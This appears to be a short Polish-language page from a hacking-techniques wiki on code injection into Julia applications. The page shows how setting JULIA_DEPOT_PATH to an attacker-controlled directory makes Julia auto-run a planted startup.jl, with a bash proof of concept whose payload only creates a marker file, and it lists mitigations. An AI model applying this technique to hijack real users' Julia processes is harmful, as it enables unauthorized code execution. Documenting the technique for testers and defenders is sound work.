# Wstrzykiwanie do aplikacji Julia

{{#include ../../../banners/hacktricks-training.md}}

## `JULIA_DEPOT_PATH` i `startup.jl`

Julia zwykle podczas uruchamiania wykonuje plik `config/startup.jl` z pierwszego depot. `JULIA_DEPOT_PATH` kontroluje listę depotów, więc wskazanie drzewa dostępnego dla atakującego przekierowuje automatycznie ładowany plik startowy.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```
Końcowy separator jest przydatny, gdy ofiara nadal potrzebuje swoich zwykłych pakietów. `julia --startup-file=no` wyłącza ten plik startowy. Wyczyść zmienną przed uruchomieniem, ponieważ kontroluje ona również rejestry pakietów, środowiska, pamięci podręczne i lokalizacje ładowania kodu.

## References

- [1] [Julia command-line interface: Plik startowy](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [2] [Julia environment variables: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
{{#include ../../../banners/hacktricks-training.md}}
